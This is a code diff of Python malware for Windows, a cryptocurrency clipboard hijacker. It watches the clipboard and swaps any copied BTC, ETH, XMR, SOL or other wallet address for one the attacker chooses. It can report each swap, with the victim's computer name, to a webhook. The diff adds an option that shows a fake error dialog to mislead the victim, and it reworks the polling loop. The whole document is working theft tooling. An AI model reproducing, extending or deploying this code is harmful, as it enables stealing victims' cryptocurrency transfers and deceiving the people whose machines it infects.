@@ -3,6 +3,7 @@ import tkinter
 import socket
 import winreg
 import shutil
+import ctypes
 import json
 import sys
 import re
@@ -25,6 +26,7 @@ bchaddr = "SET BCH ADDRESS HERE"
 single_use = False
 ping = False
 incubate = False
+false_error = False
 
 webhook_url = ""
 
@@ -77,286 +79,291 @@ def is_crypto_addr(clipboard_text):
 def main():
         root = tkinter.Tk()
         root.withdraw()
+        if false_error:
+            if cwd != str(os.path.join(os.environ['APPDATA'], "CLPPTH")):
+                ctypes.windll.user32.MessageBoxW(0, "An error has occurred!", "Error", 0x10)
 
-        try:
-            clipboard_text = root.clipboard_get()
-            var = is_crypto_addr(clipboard_text)
+        def loop():
+            try:
+                clipboard_text = root.clipboard_get()
+                var = is_crypto_addr(clipboard_text)
 
-            if var == "BTC":
-                if btcaddr != "SET BTC ADDRESS HERE":
-                    if clipboard_text != btcaddr:
-                        root.clipboard_clear()
-                        root.clipboard_append(btcaddr)
-                        root.update()
-                        if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                        if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
-                                    }
+                if var == "BTC":
+                    if btcaddr != "SET BTC ADDRESS HERE":
+                        if clipboard_text != btcaddr:
+                            root.clipboard_clear()
+                            root.clipboard_append(btcaddr)
+                            root.update()
+                            if single_use:
+                                    with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                        o.write("True")
+                                        o.close()
+                                    sys.exit()
+                            if webhook_url != "":
+                                    if ping:
+                                        message = {
+                                        "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
+                                        }
+                                    else:
+                                        message = {
+                                            "content": f"```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
+                                        }
 
-                                json_data = json.dumps(message)
+                                    json_data = json.dumps(message)
 
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
+                                    conn = http.client.HTTPSConnection(host)
+                                    conn.request("POST", url_path, json_data, headers)
 
-                                response = conn.getresponse()
+                                    response = conn.getresponse()
 
-                                response.read()
-                                conn.close()
-            elif var == "ETH":
-                if ethaddr != "SET ETH ADDRESS HERE":
-                    if clipboard_text != ethaddr:
-                        root.clipboard_clear()
-                        root.clipboard_append(ethaddr)
-                        root.update()
-                        if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                        if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
-                                    }
+                                    response.read()
+                                    conn.close()
+                elif var == "ETH":
+                    if ethaddr != "SET ETH ADDRESS HERE":
+                        if clipboard_text != ethaddr:
+                            root.clipboard_clear()
+                            root.clipboard_append(ethaddr)
+                            root.update()
+                            if single_use:
+                                    with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                        o.write("True")
+                                        o.close()
+                                    sys.exit()
+                            if webhook_url != "":
+                                    if ping:
+                                        message = {
+                                        "content": f"@everyone```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
+                                        }
+                                    else:
+                                        message = {
+                                            "content": f"```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
+                                        }
 
-                                json_data = json.dumps(message)
+                                    json_data = json.dumps(message)
 
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
+                                    conn = http.client.HTTPSConnection(host)
+                                    conn.request("POST", url_path, json_data, headers)
 
-                                response = conn.getresponse()
+                                    response = conn.getresponse()
 
-                                response.read()
-                                conn.close()
-            elif var == "LTC":
-                if ltcaddr != "SET LTC ADDRESS HERE":
-                    if clipboard_text != ltcaddr:
-                        root.clipboard_clear()
-                        root.clipboard_append(ltcaddr)
-                        root.update()
-                        if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                        if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
-                                    }
+                                    response.read()
+                                    conn.close()
+                elif var == "LTC":
+                    if ltcaddr != "SET LTC ADDRESS HERE":
+                        if clipboard_text != ltcaddr:
+                            root.clipboard_clear()
+                            root.clipboard_append(ltcaddr)
+                            root.update()
+                            if single_use:
+                                    with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                        o.write("True")
+                                        o.close()
+                                    sys.exit()
+                            if webhook_url != "":
+                                    if ping:
+                                        message = {
+                                        "content": f"@everyone```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
+                                        }
+                                    else:
+                                        message = {
+                                            "content": f"```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
+                                        }
 
-                                json_data = json.dumps(message)
+                                    json_data = json.dumps(message)
 
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
+                                    conn = http.client.HTTPSConnection(host)
+                                    conn.request("POST", url_path, json_data, headers)
 
-                                response = conn.getresponse()
+                                    response = conn.getresponse()
 
-                                response.read()
-                                conn.close()
-            elif var == "XMR":
-                if xmraddr != "SET XMR ADDRESS HERE":
-                    if clipboard_text != xmraddr:
-                        root.clipboard_clear()
-                        root.clipboard_append(xmraddr)
-                        root.update()
-                        if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                        if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
-                                    }
+                                    response.read()
+                                    conn.close()
+                elif var == "XMR":
+                    if xmraddr != "SET XMR ADDRESS HERE":
+                        if clipboard_text != xmraddr:
+                            root.clipboard_clear()
+                            root.clipboard_append(xmraddr)
+                            root.update()
+                            if single_use:
+                                    with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                        o.write("True")
+                                        o.close()
+                                    sys.exit()
+                            if webhook_url != "":
+                                    if ping:
+                                        message = {
+                                        "content": f"@everyone```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
+                                        }
+                                    else:
+                                        message = {
+                                            "content": f"```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
+                                        }
 
-                                json_data = json.dumps(message)
+                                    json_data = json.dumps(message)
 
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
+                                    conn = http.client.HTTPSConnection(host)
+                                    conn.request("POST", url_path, json_data, headers)
 
-                                response = conn.getresponse()
+                                    response = conn.getresponse()
 
-                                response.read()
-                                conn.close()
-            elif var == "SOL":
-                if soladdr != "SET SOL ADDRESS HERE":
-                    if clipboard_text != soladdr:
-                        root.clipboard_clear()
-                        root.clipboard_append(soladdr)
-                        root.update()
-                        if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                        if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
-                                    }
+                                    response.read()
+                                    conn.close()
+                elif var == "SOL":
+                    if soladdr != "SET SOL ADDRESS HERE":
+                        if clipboard_text != soladdr:
+                            root.clipboard_clear()
+                            root.clipboard_append(soladdr)
+                            root.update()
+                            if single_use:
+                                    with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                        o.write("True")
+                                        o.close()
+                                    sys.exit()
+                            if webhook_url != "":
+                                    if ping:
+                                        message = {
+                                        "content": f"@everyone```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
+                                        }
+                                    else:
+                                        message = {
+                                            "content": f"```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
+                                        }
 
-                                json_data = json.dumps(message)
+                                    json_data = json.dumps(message)
 
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
+                                    conn = http.client.HTTPSConnection(host)
+                                    conn.request("POST", url_path, json_data, headers)
 
-                                response = conn.getresponse()
+                                    response = conn.getresponse()
 
-                                response.read()
-                                conn.close()
-            elif var == "DOGE":
-                if dogeaddr != "SET DOGE ADDRESS HERE":
-                    if clipboard_text != dogeaddr:
-                        root.clipboard_clear()
-                        root.clipboard_append(dogeaddr)
-                        root.update()
-                        if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                        if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
-                                    }
+                                    response.read()
+                                    conn.close()
+                elif var == "DOGE":
+                    if dogeaddr != "SET DOGE ADDRESS HERE":
+                        if clipboard_text != dogeaddr:
+                            root.clipboard_clear()
+                            root.clipboard_append(dogeaddr)
+                            root.update()
+                            if single_use:
+                                    with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                        o.write("True")
+                                        o.close()
+                                    sys.exit()
+                            if webhook_url != "":
+                                    if ping:
+                                        message = {
+                                        "content": f"@everyone```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
+                                        }
+                                    else:
+                                        message = {
+                                            "content": f"```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
+                                        }
 
-                                json_data = json.dumps(message)
+                                    json_data = json.dumps(message)
 
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
+                                    conn = http.client.HTTPSConnection(host)
+                                    conn.request("POST", url_path, json_data, headers)
 
-                                response = conn.getresponse()
+                                    response = conn.getresponse()
 
-                                response.read()
-                                conn.close()
-            elif var == "XRP":
-                if xrpaddr != "SET XRP ADDRESS HERE":
-                    if clipboard_text != xrpaddr:
-                        root.clipboard_clear()
-                        root.clipboard_append(xrpaddr)
-                        root.update()
-                        if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                        if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected XRP address on {comp_name} - changed to {xrpaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected XRP address on {comp_name} - changed to {xrpaddr}\n```"
-                                    }
+                                    response.read()
+                                    conn.close()
+                elif var == "XRP":
+                    if xrpaddr != "SET XRP ADDRESS HERE":
+                        if clipboard_text != xrpaddr:
+                            root.clipboard_clear()
+                            root.clipboard_append(xrpaddr)
+                            root.update()
+                            if single_use:
+                                    with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                        o.write("True")
+                                        o.close()
+                                    sys.exit()
+                            if webhook_url != "":
+                                    if ping:
+                                        message = {
+                                        "content": f"@everyone```\ndetected XRP address on {comp_name} - changed to {xrpaddr}\n```"
+                                        }
+                                    else:
+                                        message = {
+                                            "content": f"```\ndetected XRP address on {comp_name} - changed to {xrpaddr}\n```"
+                                        }
 
-                                json_data = json.dumps(message)
+                                    json_data = json.dumps(message)
 
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
+                                    conn = http.client.HTTPSConnection(host)
+                                    conn.request("POST", url_path, json_data, headers)
 
-                                response = conn.getresponse()
+                                    response = conn.getresponse()
 
-                                response.read()
-                                conn.close()
-            elif var == "TRX":
-                if trxaddr != "SET TRX ADDRESS HERE":
-                    if clipboard_text != trxaddr:
-                        root.clipboard_clear()
-                        root.clipboard_append(trxaddr)
-                        root.update()
-                        if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                        if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected TRX address on {comp_name} - changed to {trxaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected TRX address on {comp_name} - changed to {trxaddr}\n```"
-                                    }
+                                    response.read()
+                                    conn.close()
+                elif var == "TRX":
+                    if trxaddr != "SET TRX ADDRESS HERE":
+                        if clipboard_text != trxaddr:
+                            root.clipboard_clear()
+                            root.clipboard_append(trxaddr)
+                            root.update()
+                            if single_use:
+                                    with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                        o.write("True")
+                                        o.close()
+                                    sys.exit()
+                            if webhook_url != "":
+                                    if ping:
+                                        message = {
+                                        "content": f"@everyone```\ndetected TRX address on {comp_name} - changed to {trxaddr}\n```"
+                                        }
+                                    else:
+                                        message = {
+                                            "content": f"```\ndetected TRX address on {comp_name} - changed to {trxaddr}\n```"
+                                        }
 
-                                json_data = json.dumps(message)
+                                    json_data = json.dumps(message)
 
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
+                                    conn = http.client.HTTPSConnection(host)
+                                    conn.request("POST", url_path, json_data, headers)
 
-                                response = conn.getresponse()
+                                    response = conn.getresponse()
 
-                                response.read()
-                                conn.close()
-            elif var == "BCH":
-                if bchaddr != "SET BCH ADDRESS HERE":
-                    if clipboard_text != bchaddr:
-                        root.clipboard_clear()
-                        root.clipboard_append(bchaddr)
-                        root.update()
-                        if single_use:
-                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                    o.write("True")
-                                    o.close()
-                                sys.exit()
-                        if webhook_url != "":
-                                if ping:
-                                    message = {
-                                    "content": f"@everyone```\ndetected BCH address on {comp_name} - changed to {bchaddr}\n```"
-                                    }
-                                else:
-                                    message = {
-                                        "content": f"```\ndetected BCH address on {comp_name} - changed to {bchaddr}\n```"
-                                    }
+                                    response.read()
+                                    conn.close()
+                elif var == "BCH":
+                    if bchaddr != "SET BCH ADDRESS HERE":
+                        if clipboard_text != bchaddr:
+                            root.clipboard_clear()
+                            root.clipboard_append(bchaddr)
+                            root.update()
+                            if single_use:
+                                    with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                        o.write("True")
+                                        o.close()
+                                    sys.exit()
+                            if webhook_url != "":
+                                    if ping:
+                                        message = {
+                                        "content": f"@everyone```\ndetected BCH address on {comp_name} - changed to {bchaddr}\n```"
+                                        }
+                                    else:
+                                        message = {
+                                            "content": f"```\ndetected BCH address on {comp_name} - changed to {bchaddr}\n```"
+                                        }
 
-                                json_data = json.dumps(message)
+                                    json_data = json.dumps(message)
 
-                                conn = http.client.HTTPSConnection(host)
-                                conn.request("POST", url_path, json_data, headers)
+                                    conn = http.client.HTTPSConnection(host)
+                                    conn.request("POST", url_path, json_data, headers)
 
-                                response = conn.getresponse()
+                                    response = conn.getresponse()
 
-                                response.read()
-                                conn.close()
-            else:
+                                    response.read()
+                                    conn.close()
+                else:
+                    pass
+            except Exception:
                 pass
-        except Exception:
-             pass
-        root.after(100, main)
+            root.after(100, loop)
+        loop()
 
 def dupe_self():
     try:
